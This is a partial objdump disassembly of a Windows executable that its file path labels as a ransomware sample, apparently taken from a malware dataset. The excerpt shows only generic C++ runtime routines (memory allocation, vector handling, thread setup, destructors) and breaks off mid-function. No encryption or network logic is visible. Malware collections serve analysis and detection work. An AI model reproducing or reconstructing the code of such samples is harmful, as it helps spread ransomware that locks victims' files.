
malware_samples/ransomware/964217072a18c289f0b24ef402b962b331cf8c71b55681dd5390b42be8ee310b.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	8b 44 24 04          	mov    0x4(%esp),%eax
  401004:	85 c0                	test   %eax,%eax
  401006:	75 01                	jne    0x401009
  401008:	c3                   	ret
  401009:	3d 00 10 00 00       	cmp    $0x1000,%eax
  40100e:	72 24                	jb     0x401034
  401010:	8d 48 23             	lea    0x23(%eax),%ecx
  401013:	3b c8                	cmp    %eax,%ecx
  401015:	0f 86 b5 0c 00 00    	jbe    0x401cd0
  40101b:	51                   	push   %ecx
  40101c:	e8 5a 94 00 00       	call   0x40a47b
  401021:	8b c8                	mov    %eax,%ecx
  401023:	83 c4 04             	add    $0x4,%esp
  401026:	85 c9                	test   %ecx,%ecx
  401028:	74 13                	je     0x40103d
  40102a:	8d 41 23             	lea    0x23(%ecx),%eax
  40102d:	83 e0 e0             	and    $0xffffffe0,%eax
  401030:	89 48 fc             	mov    %ecx,-0x4(%eax)
  401033:	c3                   	ret
  401034:	89 44 24 04          	mov    %eax,0x4(%esp)
  401038:	e9 3e 94 00 00       	jmp    0x40a47b
  40103d:	6a 00                	push   $0x0
  40103f:	6a 00                	push   $0x0
  401041:	6a 00                	push   $0x0
  401043:	6a 00                	push   $0x0
  401045:	6a 00                	push   $0x0
  401047:	e8 23 cd 00 00       	call   0x40dd6f
  40104c:	cc                   	int3
  40104d:	cc                   	int3
  40104e:	cc                   	int3
  40104f:	cc                   	int3
  401050:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  401054:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  40105a:	72 16                	jb     0x401072
  40105c:	8b 44 24 04          	mov    0x4(%esp),%eax
  401060:	83 c1 23             	add    $0x23,%ecx
  401063:	8b 50 fc             	mov    -0x4(%eax),%edx
  401066:	2b c2                	sub    %edx,%eax
  401068:	83 c0 fc             	add    $0xfffffffc,%eax
  40106b:	83 f8 1f             	cmp    $0x1f,%eax
  40106e:	77 13                	ja     0x401083
  401070:	eb 04                	jmp    0x401076
  401072:	8b 54 24 04          	mov    0x4(%esp),%edx
  401076:	89 4c 24 08          	mov    %ecx,0x8(%esp)
  40107a:	89 54 24 04          	mov    %edx,0x4(%esp)
  40107e:	e9 28 94 00 00       	jmp    0x40a4ab
  401083:	6a 00                	push   $0x0
  401085:	6a 00                	push   $0x0
  401087:	6a 00                	push   $0x0
  401089:	6a 00                	push   $0x0
  40108b:	6a 00                	push   $0x0
  40108d:	e8 dd cc 00 00       	call   0x40dd6f
  401092:	cc                   	int3
  401093:	cc                   	int3
  401094:	cc                   	int3
  401095:	cc                   	int3
  401096:	cc                   	int3
  401097:	cc                   	int3
  401098:	cc                   	int3
  401099:	cc                   	int3
  40109a:	cc                   	int3
  40109b:	cc                   	int3
  40109c:	cc                   	int3
  40109d:	cc                   	int3
  40109e:	cc                   	int3
  40109f:	cc                   	int3
  4010a0:	83 ec 0c             	sub    $0xc,%esp
  4010a3:	56                   	push   %esi
  4010a4:	8b 74 24 14          	mov    0x14(%esp),%esi
  4010a8:	57                   	push   %edi
  4010a9:	8b f9                	mov    %ecx,%edi
  4010ab:	8b 17                	mov    (%edi),%edx
  4010ad:	2b f2                	sub    %edx,%esi
  4010af:	8b 47 04             	mov    0x4(%edi),%eax
  4010b2:	2b c2                	sub    %edx,%eax
  4010b4:	c1 fe 03             	sar    $0x3,%esi
  4010b7:	c1 f8 03             	sar    $0x3,%eax
  4010ba:	3d ff ff ff 1f       	cmp    $0x1fffffff,%eax
  4010bf:	0f 84 4b 01 00 00    	je     0x401210
  4010c5:	8b 4f 08             	mov    0x8(%edi),%ecx
  4010c8:	2b ca                	sub    %edx,%ecx
  4010ca:	c1 f9 03             	sar    $0x3,%ecx
  4010cd:	53                   	push   %ebx
  4010ce:	8d 58 01             	lea    0x1(%eax),%ebx
  4010d1:	8b d1                	mov    %ecx,%edx
  4010d3:	d1 ea                	shr    $1,%edx
  4010d5:	b8 ff ff ff 1f       	mov    $0x1fffffff,%eax
  4010da:	2b c2                	sub    %edx,%eax
  4010dc:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  4010e0:	55                   	push   %ebp
  4010e1:	3b c8                	cmp    %eax,%ecx
  4010e3:	0f 87 22 01 00 00    	ja     0x40120b
  4010e9:	8d 04 0a             	lea    (%edx,%ecx,1),%eax
  4010ec:	8b eb                	mov    %ebx,%ebp
  4010ee:	3b c3                	cmp    %ebx,%eax
  4010f0:	0f 43 e8             	cmovae %eax,%ebp
  4010f3:	81 fd ff ff ff 1f    	cmp    $0x1fffffff,%ebp
  4010f9:	0f 87 0c 01 00 00    	ja     0x40120b
  4010ff:	c1 e5 03             	shl    $0x3,%ebp
  401102:	85 ed                	test   %ebp,%ebp
  401104:	75 04                	jne    0x40110a
  401106:	33 db                	xor    %ebx,%ebx
  401108:	eb 3a                	jmp    0x401144
  40110a:	81 fd 00 10 00 00    	cmp    $0x1000,%ebp
  401110:	72 27                	jb     0x401139
  401112:	8d 45 23             	lea    0x23(%ebp),%eax
  401115:	3b c5                	cmp    %ebp,%eax
  401117:	0f 86 ee 00 00 00    	jbe    0x40120b
  40111d:	50                   	push   %eax
  40111e:	e8 58 93 00 00       	call   0x40a47b
  401123:	83 c4 04             	add    $0x4,%esp
  401126:	85 c0                	test   %eax,%eax
  401128:	0f 84 ec 00 00 00    	je     0x40121a
  40112e:	8d 58 23             	lea    0x23(%eax),%ebx
  401131:	83 e3 e0             	and    $0xffffffe0,%ebx
  401134:	89 43 fc             	mov    %eax,-0x4(%ebx)
  401137:	eb 0b                	jmp    0x401144
  401139:	55                   	push   %ebp
  40113a:	e8 3c 93 00 00       	call   0x40a47b
  40113f:	83 c4 04             	add    $0x4,%esp
  401142:	8b d8                	mov    %eax,%ebx
  401144:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  401148:	8d 04 f3             	lea    (%ebx,%esi,8),%eax
  40114b:	89 44 24 10          	mov    %eax,0x10(%esp)
  40114f:	83 c0 08             	add    $0x8,%eax
  401152:	89 44 24 14          	mov    %eax,0x14(%esp)
  401156:	8b 44 24 10          	mov    0x10(%esp),%eax
  40115a:	8b 71 04             	mov    0x4(%ecx),%esi
  40115d:	8b 11                	mov    (%ecx),%edx
  40115f:	c7 01 00 00 00 00    	movl   $0x0,(%ecx)
  401165:	c7 41 04 00 00 00 00 	movl   $0x0,0x4(%ecx)
  40116c:	89 70 04             	mov    %esi,0x4(%eax)
  40116f:	8b 74 24 20          	mov    0x20(%esp),%esi
  401173:	89 10                	mov    %edx,(%eax)
  401175:	8b 4f 04             	mov    0x4(%edi),%ecx
  401178:	8b 07                	mov    (%edi),%eax
  40117a:	3b f1                	cmp    %ecx,%esi
  40117c:	75 04                	jne    0x401182
  40117e:	8b d3                	mov    %ebx,%edx
  401180:	eb 15                	jmp    0x401197
  401182:	57                   	push   %edi
  401183:	53                   	push   %ebx
  401184:	56                   	push   %esi
  401185:	50                   	push   %eax
  401186:	e8 05 01 00 00       	call   0x401290
  40118b:	8b 4f 04             	mov    0x4(%edi),%ecx
  40118e:	83 c4 10             	add    $0x10,%esp
  401191:	8b 54 24 14          	mov    0x14(%esp),%edx
  401195:	8b c6                	mov    %esi,%eax
  401197:	57                   	push   %edi
  401198:	52                   	push   %edx
  401199:	51                   	push   %ecx
  40119a:	50                   	push   %eax
  40119b:	e8 f0 00 00 00       	call   0x401290
  4011a0:	8b 17                	mov    (%edi),%edx
  4011a2:	83 c4 10             	add    $0x10,%esp
  4011a5:	85 d2                	test   %edx,%edx
  4011a7:	74 42                	je     0x4011eb
  4011a9:	8b 4f 04             	mov    0x4(%edi),%ecx
  4011ac:	8b c2                	mov    %edx,%eax
  4011ae:	3b c1                	cmp    %ecx,%eax
  4011b0:	74 0d                	je     0x4011bf
  4011b2:	83 78 04 00          	cmpl   $0x0,0x4(%eax)
  4011b6:	75 5d                	jne    0x401215
  4011b8:	83 c0 08             	add    $0x8,%eax
  4011bb:	3b c1                	cmp    %ecx,%eax
  4011bd:	75 f3                	jne    0x4011b2
  4011bf:	8b 4f 08             	mov    0x8(%edi),%ecx
  4011c2:	2b ca                	sub    %edx,%ecx
  4011c4:	83 e1 f8             	and    $0xfffffff8,%ecx
  4011c7:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4011cd:	72 12                	jb     0x4011e1
  4011cf:	8b 72 fc             	mov    -0x4(%edx),%esi
  4011d2:	83 c1 23             	add    $0x23,%ecx
  4011d5:	2b d6                	sub    %esi,%edx
  4011d7:	8d 42 fc             	lea    -0x4(%edx),%eax
  4011da:	83 f8 1f             	cmp    $0x1f,%eax
  4011dd:	77 3b                	ja     0x40121a
  4011df:	8b d6                	mov    %esi,%edx
  4011e1:	51                   	push   %ecx
  4011e2:	52                   	push   %edx
  4011e3:	e8 c3 92 00 00       	call   0x40a4ab
  4011e8:	83 c4 08             	add    $0x8,%esp
  4011eb:	8b 44 24 18          	mov    0x18(%esp),%eax
  4011ef:	89 1f                	mov    %ebx,(%edi)
  4011f1:	8d 0c c3             	lea    (%ebx,%eax,8),%ecx
  4011f4:	8b 44 24 10          	mov    0x10(%esp),%eax
  4011f8:	89 4f 04             	mov    %ecx,0x4(%edi)
  4011fb:	8d 0c 2b             	lea    (%ebx,%ebp,1),%ecx
  4011fe:	5d                   	pop    %ebp
  4011ff:	5b                   	pop    %ebx
  401200:	89 4f 08             	mov    %ecx,0x8(%edi)
  401203:	5f                   	pop    %edi
  401204:	5e                   	pop    %esi
  401205:	83 c4 0c             	add    $0xc,%esp
  401208:	c2 08 00             	ret    $0x8
  40120b:	e8 c0 0a 00 00       	call   0x401cd0
  401210:	e8 eb 0a 00 00       	call   0x401d00
  401215:	e8 30 f1 00 00       	call   0x41034a
  40121a:	6a 00                	push   $0x0
  40121c:	6a 00                	push   $0x0
  40121e:	6a 00                	push   $0x0
  401220:	6a 00                	push   $0x0
  401222:	6a 00                	push   $0x0
  401224:	e8 46 cb 00 00       	call   0x40dd6f
  401229:	cc                   	int3
  40122a:	cc                   	int3
  40122b:	cc                   	int3
  40122c:	cc                   	int3
  40122d:	cc                   	int3
  40122e:	cc                   	int3
  40122f:	cc                   	int3
  401230:	55                   	push   %ebp
  401231:	8b ec                	mov    %esp,%ebp
  401233:	6a ff                	push   $0xffffffff
  401235:	68 c0 da 41 00       	push   $0x41dac0
  40123a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401240:	50                   	push   %eax
  401241:	56                   	push   %esi
  401242:	a1 80 80 42 00       	mov    0x428080,%eax
  401247:	33 c5                	xor    %ebp,%eax
  401249:	50                   	push   %eax
  40124a:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40124d:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  401253:	8b 75 08             	mov    0x8(%ebp),%esi
  401256:	8b ce                	mov    %esi,%ecx
  401258:	e8 93 05 00 00       	call   0x4017f0
  40125d:	e8 81 89 00 00       	call   0x409be3
  401262:	85 f6                	test   %esi,%esi
  401264:	74 0b                	je     0x401271
  401266:	6a 04                	push   $0x4
  401268:	56                   	push   %esi
  401269:	e8 3d 92 00 00       	call   0x40a4ab
  40126e:	83 c4 08             	add    $0x8,%esp
  401271:	33 c0                	xor    %eax,%eax
  401273:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401276:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40127d:	59                   	pop    %ecx
  40127e:	5e                   	pop    %esi
  40127f:	8b e5                	mov    %ebp,%esp
  401281:	5d                   	pop    %ebp
  401282:	c2 04 00             	ret    $0x4
  401285:	cc                   	int3
  401286:	cc                   	int3
  401287:	cc                   	int3
  401288:	cc                   	int3
  401289:	cc                   	int3
  40128a:	cc                   	int3
  40128b:	cc                   	int3
  40128c:	cc                   	int3
  40128d:	cc                   	int3
  40128e:	cc                   	int3
  40128f:	cc                   	int3
  401290:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401294:	8b 44 24 0c          	mov    0xc(%esp),%eax
  401298:	57                   	push   %edi
  401299:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  40129d:	3b cf                	cmp    %edi,%ecx
  40129f:	74 23                	je     0x4012c4
  4012a1:	56                   	push   %esi
  4012a2:	8b 11                	mov    (%ecx),%edx
  4012a4:	8b 71 04             	mov    0x4(%ecx),%esi
  4012a7:	c7 01 00 00 00 00    	movl   $0x0,(%ecx)
  4012ad:	c7 41 04 00 00 00 00 	movl   $0x0,0x4(%ecx)
  4012b4:	83 c1 08             	add    $0x8,%ecx
  4012b7:	89 10                	mov    %edx,(%eax)
  4012b9:	89 70 04             	mov    %esi,0x4(%eax)
  4012bc:	83 c0 08             	add    $0x8,%eax
  4012bf:	3b cf                	cmp    %edi,%ecx
  4012c1:	75 df                	jne    0x4012a2
  4012c3:	5e                   	pop    %esi
  4012c4:	5f                   	pop    %edi
  4012c5:	c3                   	ret
  4012c6:	cc                   	int3
  4012c7:	cc                   	int3
  4012c8:	cc                   	int3
  4012c9:	cc                   	int3
  4012ca:	cc                   	int3
  4012cb:	cc                   	int3
  4012cc:	cc                   	int3
  4012cd:	cc                   	int3
  4012ce:	cc                   	int3
  4012cf:	cc                   	int3
  4012d0:	55                   	push   %ebp
  4012d1:	8b ec                	mov    %esp,%ebp
  4012d3:	6a ff                	push   $0xffffffff
  4012d5:	68 08 db 41 00       	push   $0x41db08
  4012da:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4012e0:	50                   	push   %eax
  4012e1:	83 ec 10             	sub    $0x10,%esp
  4012e4:	56                   	push   %esi
  4012e5:	57                   	push   %edi
  4012e6:	a1 80 80 42 00       	mov    0x428080,%eax
  4012eb:	33 c5                	xor    %ebp,%eax
  4012ed:	50                   	push   %eax
  4012ee:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4012f1:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4012f7:	8b f9                	mov    %ecx,%edi
  4012f9:	89 7d f0             	mov    %edi,-0x10(%ebp)
  4012fc:	c7 07 00 00 00 00    	movl   $0x0,(%edi)
  401302:	c7 47 04 00 00 00 00 	movl   $0x0,0x4(%edi)
  401309:	c7 47 08 00 00 00 00 	movl   $0x0,0x8(%edi)
  401310:	8d 77 0c             	lea    0xc(%edi),%esi
  401313:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40131a:	89 75 ec             	mov    %esi,-0x14(%ebp)
  40131d:	6a 08                	push   $0x8
  40131f:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  401325:	c7 46 04 00 00 00 00 	movl   $0x0,0x4(%esi)
  40132c:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  401333:	c7 46 0c 00 00 00 00 	movl   $0x0,0xc(%esi)
  40133a:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  401341:	e8 35 91 00 00       	call   0x40a47b
  401346:	83 c4 04             	add    $0x4,%esp
  401349:	c7 40 04 00 00 00 00 	movl   $0x0,0x4(%eax)
  401350:	89 06                	mov    %eax,(%esi)
  401352:	89 30                	mov    %esi,(%eax)
  401354:	0f 57 c0             	xorps  %xmm0,%xmm0
  401357:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  40135b:	0f 11 47 2c          	movups %xmm0,0x2c(%edi)
  40135f:	33 f6                	xor    %esi,%esi
  401361:	66 0f d6 47 3c       	movq   %xmm0,0x3c(%edi)
  401366:	c7 47 44 00 00 00 00 	movl   $0x0,0x44(%edi)
  40136d:	c7 47 24 00 00 00 00 	movl   $0x0,0x24(%edi)
  401374:	c7 47 28 00 00 00 00 	movl   $0x0,0x28(%edi)
  40137b:	c7 47 48 ff ff ff ff 	movl   $0xffffffff,0x48(%edi)
  401382:	c7 47 20 02 00 00 00 	movl   $0x2,0x20(%edi)
  401389:	c7 47 4c 00 00 00 00 	movl   $0x0,0x4c(%edi)
  401390:	c7 47 50 00 00 00 00 	movl   $0x0,0x50(%edi)
  401397:	c7 47 54 00 00 00 00 	movl   $0x0,0x54(%edi)
  40139e:	0f 11 47 58          	movups %xmm0,0x58(%edi)
  4013a2:	0f 11 47 68          	movups %xmm0,0x68(%edi)
  4013a6:	c6 47 78 00          	movb   $0x0,0x78(%edi)
  4013aa:	39 75 08             	cmp    %esi,0x8(%ebp)
  4013ad:	76 7b                	jbe    0x40142a
  4013af:	90                   	nop
  4013b0:	6a 04                	push   $0x4
  4013b2:	e8 c4 90 00 00       	call   0x40a47b
  4013b7:	83 c4 04             	add    $0x4,%esp
  4013ba:	85 c0                	test   %eax,%eax
  4013bc:	74 04                	je     0x4013c2
  4013be:	89 38                	mov    %edi,(%eax)
  4013c0:	eb 02                	jmp    0x4013c4
  4013c2:	33 c0                	xor    %eax,%eax
  4013c4:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4013c7:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4013ca:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  4013ce:	51                   	push   %ecx
  4013cf:	6a 00                	push   $0x0
  4013d1:	50                   	push   %eax
  4013d2:	68 30 12 40 00       	push   $0x401230
  4013d7:	6a 00                	push   $0x0
  4013d9:	6a 00                	push   $0x0
  4013db:	e8 02 f1 00 00       	call   0x4104e2
  4013e0:	8b d0                	mov    %eax,%edx
  4013e2:	83 c4 18             	add    $0x18,%esp
  4013e5:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  4013e8:	85 d2                	test   %edx,%edx
  4013ea:	74 53                	je     0x40143f
  4013ec:	8b 4f 04             	mov    0x4(%edi),%ecx
  4013ef:	c6 45 fc 03          	movb   $0x3,-0x4(%ebp)
  4013f3:	3b 4f 08             	cmp    0x8(%edi),%ecx
  4013f6:	74 16                	je     0x40140e
  4013f8:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4013fb:	0f 57 c0             	xorps  %xmm0,%xmm0
  4013fe:	66 0f 13 45 e4       	movlpd %xmm0,-0x1c(%ebp)
  401403:	89 11                	mov    %edx,(%ecx)
  401405:	89 41 04             	mov    %eax,0x4(%ecx)
  401408:	83 47 04 08          	addl   $0x8,0x4(%edi)
  40140c:	eb 0c                	jmp    0x40141a
  40140e:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401411:	50                   	push   %eax
  401412:	51                   	push   %ecx
  401413:	8b cf                	mov    %edi,%ecx
  401415:	e8 86 fc ff ff       	call   0x4010a0
  40141a:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
  40141e:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  401422:	75 29                	jne    0x40144d
  401424:	46                   	inc    %esi
  401425:	3b 75 08             	cmp    0x8(%ebp),%esi
  401428:	72 86                	jb     0x4013b0
  40142a:	8b c7                	mov    %edi,%eax
  40142c:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40142f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401436:	59                   	pop    %ecx
  401437:	5f                   	pop    %edi
  401438:	5e                   	pop    %esi
  401439:	8b e5                	mov    %ebp,%esp
  40143b:	5d                   	pop    %ebp
  40143c:	c2 04 00             	ret    $0x4
  40143f:	6a 06                	push   $0x6
  401441:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  401448:	e8 f4 8d 00 00       	call   0x40a241
  40144d:	e8 f8 ee 00 00       	call   0x41034a
  401452:	cc                   	int3
  401453:	cc                   	int3
  401454:	cc                   	int3
  401455:	cc                   	int3
  401456:	cc                   	int3
  401457:	cc                   	int3
  401458:	cc                   	int3
  401459:	cc                   	int3
  40145a:	cc                   	int3
  40145b:	cc                   	int3
  40145c:	cc                   	int3
  40145d:	cc                   	int3
  40145e:	cc                   	int3
  40145f:	cc                   	int3
  401460:	56                   	push   %esi
  401461:	8b f1                	mov    %ecx,%esi
  401463:	0f 57 c0             	xorps  %xmm0,%xmm0
  401466:	8d 46 04             	lea    0x4(%esi),%eax
  401469:	50                   	push   %eax
  40146a:	c7 06 00 e3 41 00    	movl   $0x41e300,(%esi)
  401470:	66 0f d6 00          	movq   %xmm0,(%eax)
  401474:	8b 44 24 0c          	mov    0xc(%esp),%eax
  401478:	83 c0 04             	add    $0x4,%eax
  40147b:	50                   	push   %eax
  40147c:	e8 12 a3 00 00       	call   0x40b793
  401481:	83 c4 08             	add    $0x8,%esp
  401484:	c7 06 20 e3 41 00    	movl   $0x41e320,(%esi)
  40148a:	8b c6                	mov    %esi,%eax
  40148c:	5e                   	pop    %esi
  40148d:	c2 04 00             	ret    $0x4
  401490:	56                   	push   %esi
  401491:	8b f1                	mov    %ecx,%esi
  401493:	0f 57 c0             	xorps  %xmm0,%xmm0
  401496:	8d 46 04             	lea    0x4(%esi),%eax
  401499:	50                   	push   %eax
  40149a:	c7 06 00 e3 41 00    	movl   $0x41e300,(%esi)
  4014a0:	66 0f d6 00          	movq   %xmm0,(%eax)
  4014a4:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4014a8:	83 c0 04             	add    $0x4,%eax
  4014ab:	50                   	push   %eax
  4014ac:	e8 e2 a2 00 00       	call   0x40b793
  4014b1:	83 c4 08             	add    $0x8,%esp
  4014b4:	c7 06 2c e3 41 00    	movl   $0x41e32c,(%esi)
  4014ba:	8b c6                	mov    %esi,%eax
  4014bc:	5e                   	pop    %esi
  4014bd:	c2 04 00             	ret    $0x4
  4014c0:	0f 57 c0             	xorps  %xmm0,%xmm0
  4014c3:	8b c1                	mov    %ecx,%eax
  4014c5:	66 0f d6 41 04       	movq   %xmm0,0x4(%ecx)
  4014ca:	c7 41 04 34 e3 41 00 	movl   $0x41e334,0x4(%ecx)
  4014d1:	c7 01 2c e3 41 00    	movl   $0x41e32c,(%ecx)
  4014d7:	c3                   	ret
  4014d8:	cc                   	int3
  4014d9:	cc                   	int3
  4014da:	cc                   	int3
  4014db:	cc                   	int3
  4014dc:	cc                   	int3
  4014dd:	cc                   	int3
  4014de:	cc                   	int3
  4014df:	cc                   	int3
  4014e0:	56                   	push   %esi
  4014e1:	8b f1                	mov    %ecx,%esi
  4014e3:	0f 57 c0             	xorps  %xmm0,%xmm0
  4014e6:	8d 46 04             	lea    0x4(%esi),%eax
  4014e9:	50                   	push   %eax
  4014ea:	c7 06 00 e3 41 00    	movl   $0x41e300,(%esi)
  4014f0:	66 0f d6 00          	movq   %xmm0,(%eax)
  4014f4:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4014f8:	83 c0 04             	add    $0x4,%eax
  4014fb:	50                   	push   %eax
  4014fc:	e8 92 a2 00 00       	call   0x40b793
  401501:	83 c4 08             	add    $0x8,%esp
  401504:	8b c6                	mov    %esi,%eax
  401506:	5e                   	pop    %esi
  401507:	c2 04 00             	ret    $0x4
  40150a:	cc                   	int3
  40150b:	cc                   	int3
  40150c:	cc                   	int3
  40150d:	cc                   	int3
  40150e:	cc                   	int3
  40150f:	cc                   	int3
  401510:	56                   	push   %esi
  401511:	8b f1                	mov    %ecx,%esi
  401513:	57                   	push   %edi
  401514:	8b 4e 10             	mov    0x10(%esi),%ecx
  401517:	85 c9                	test   %ecx,%ecx
  401519:	74 45                	je     0x401560
  40151b:	0f 1f 44 00 00       	nopl   0x0(%eax,%eax,1)
  401520:	8b 46 0c             	mov    0xc(%esi),%eax
  401523:	48                   	dec    %eax
  401524:	03 c8                	add    %eax,%ecx
  401526:	8b 46 08             	mov    0x8(%esi),%eax
  401529:	48                   	dec    %eax
  40152a:	23 c8                	and    %eax,%ecx
  40152c:	8b 46 04             	mov    0x4(%esi),%eax
  40152f:	8b 3c 88             	mov    (%eax,%ecx,4),%edi
  401532:	8b 4f 24             	mov    0x24(%edi),%ecx
  401535:	85 c9                	test   %ecx,%ecx
  401537:	74 15                	je     0x40154e
  401539:	8b 11                	mov    (%ecx),%edx
  40153b:	3b cf                	cmp    %edi,%ecx
  40153d:	0f 95 c0             	setne  %al
  401540:	0f b6 c0             	movzbl %al,%eax
  401543:	50                   	push   %eax
  401544:	ff 52 10             	call   *0x10(%edx)
  401547:	c7 47 24 00 00 00 00 	movl   $0x0,0x24(%edi)
  40154e:	8b 4e 10             	mov    0x10(%esi),%ecx
  401551:	83 e9 01             	sub    $0x1,%ecx
  401554:	89 4e 10             	mov    %ecx,0x10(%esi)
  401557:	75 c7                	jne    0x401520
  401559:	c7 46 0c 00 00 00 00 	movl   $0x0,0xc(%esi)
  401560:	83 7e 04 00          	cmpl   $0x0,0x4(%esi)
  401564:	74 5f                	je     0x4015c5
  401566:	8b 7e 08             	mov    0x8(%esi),%edi
  401569:	85 ff                	test   %edi,%edi
  40156b:	7e 1d                	jle    0x40158a
  40156d:	0f 1f 00             	nopl   (%eax)
  401570:	8b 46 04             	mov    0x4(%esi),%eax
  401573:	4f                   	dec    %edi
  401574:	8b 04 b8             	mov    (%eax,%edi,4),%eax
  401577:	85 c0                	test   %eax,%eax
  401579:	74 0b                	je     0x401586
  40157b:	6a 28                	push   $0x28
  40157d:	50                   	push   %eax
  40157e:	e8 28 8f 00 00       	call   0x40a4ab
  401583:	83 c4 08             	add    $0x8,%esp
  401586:	85 ff                	test   %edi,%edi
  401588:	7f e6                	jg     0x401570
  40158a:	8b 4e 08             	mov    0x8(%esi),%ecx
  40158d:	8b 46 04             	mov    0x4(%esi),%eax
  401590:	c1 e1 02             	shl    $0x2,%ecx
  401593:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  401599:	72 12                	jb     0x4015ad
  40159b:	8b 50 fc             	mov    -0x4(%eax),%edx
  40159e:	83 c1 23             	add    $0x23,%ecx
  4015a1:	2b c2                	sub    %edx,%eax
  4015a3:	83 c0 fc             	add    $0xfffffffc,%eax
  4015a6:	83 f8 1f             	cmp    $0x1f,%eax
  4015a9:	77 30                	ja     0x4015db
  4015ab:	8b c2                	mov    %edx,%eax
  4015ad:	51                   	push   %ecx
  4015ae:	50                   	push   %eax
  4015af:	e8 f7 8e 00 00       	call   0x40a4ab
  4015b4:	83 c4 08             	add    $0x8,%esp
  4015b7:	c7 46 04 00 00 00 00 	movl   $0x0,0x4(%esi)
  4015be:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  4015c5:	8b 06                	mov    (%esi),%eax
  4015c7:	6a 08                	push   $0x8
  4015c9:	50                   	push   %eax
  4015ca:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  4015d0:	e8 d6 8e 00 00       	call   0x40a4ab
  4015d5:	83 c4 08             	add    $0x8,%esp
  4015d8:	5f                   	pop    %edi
  4015d9:	5e                   	pop    %esi
  4015da:	c3                   	ret
  4015db:	6a 00                	push   $0x0
  4015dd:	6a 00                	push   $0x0
  4015df:	6a 00                	push   $0x0
  4015e1:	6a 00                	push   $0x0
  4015e3:	6a 00                	push   $0x0
  4015e5:	e8 85 c7 00 00       	call   0x40dd6f
  4015ea:	cc                   	int3
  4015eb:	cc                   	int3
  4015ec:	cc                   	int3
  4015ed:	cc                   	int3
  4015ee:	cc                   	int3
  4015ef:	cc                   	int3
  4015f0:	56                   	push   %esi
  4015f1:	8b f1                	mov    %ecx,%esi
  4015f3:	8b 4e 24             	mov    0x24(%esi),%ecx
  4015f6:	85 c9                	test   %ecx,%ecx
  4015f8:	74 15                	je     0x40160f
  4015fa:	8b 11                	mov    (%ecx),%edx
  4015fc:	3b ce                	cmp    %esi,%ecx
  4015fe:	0f 95 c0             	setne  %al
  401601:	0f b6 c0             	movzbl %al,%eax
  401604:	50                   	push   %eax
  401605:	ff 52 10             	call   *0x10(%edx)
  401608:	c7 46 24 00 00 00 00 	movl   $0x0,0x24(%esi)
  40160f:	5e                   	pop    %esi
  401610:	c3                   	ret
  401611:	cc                   	int3
  401612:	cc                   	int3
  401613:	cc                   	int3
  401614:	cc                   	int3
  401615:	cc                   	int3
  401616:	cc                   	int3
  401617:	cc                   	int3
  401618:	cc                   	int3
  401619:	cc                   	int3
  40161a:	cc                   	int3
  40161b:	cc                   	int3
  40161c:	cc                   	int3
  40161d:	cc                   	int3
  40161e:	cc                   	int3
  40161f:	cc                   	int3
  401620:	e9 eb fe ff ff       	jmp    0x401510
  401625:	cc                   	int3
  401626:	cc                   	int3
  401627:	cc                   	int3
  401628:	cc                   	int3
  401629:	cc                   	int3
  40162a:	cc                   	int3
  40162b:	cc                   	int3
  40162c:	cc                   	int3
  40162d:	cc                   	int3
  40162e:	cc                   	int3
  40162f:	cc                   	int3
  401630:	80 79 04 00          	cmpb   $0x0,0x4(%ecx)
  401634:	74 08                	je     0x40163e
  401636:	ff 31                	push   (%ecx)
  401638:	e8 d7 83 00 00       	call   0x409a14
  40163d:	59                   	pop    %ecx
  40163e:	c3                   	ret
  40163f:	cc                   	int3
  401640:	8b 01                	mov    (%ecx),%eax
  401642:	85 c0                	test   %eax,%eax
  401644:	74 0b                	je     0x401651
  401646:	6a 04                	push   $0x4
  401648:	50                   	push   %eax
  401649:	e8 5d 8e 00 00       	call   0x40a4ab
  40164e:	83 c4 08             	add    $0x8,%esp
  401651:	c3                   	ret
  401652:	cc                   	int3
  401653:	cc                   	int3
  401654:	cc                   	int3
  401655:	cc                   	int3
  401656:	cc                   	int3
  401657:	cc                   	int3
  401658:	cc                   	int3
  401659:	cc                   	int3
  40165a:	cc                   	int3
  40165b:	cc                   	int3
  40165c:	cc                   	int3
  40165d:	cc                   	int3
  40165e:	cc                   	int3
  40165f:	cc                   	int3
  401660:	56                   	push   %esi
  401661:	8b f1                	mov    %ecx,%esi
  401663:	8b 16                	mov    (%esi),%edx
  401665:	85 d2                	test   %edx,%edx
  401667:	74 58                	je     0x4016c1
  401669:	8b 4e 04             	mov    0x4(%esi),%ecx
  40166c:	8b c2                	mov    %edx,%eax
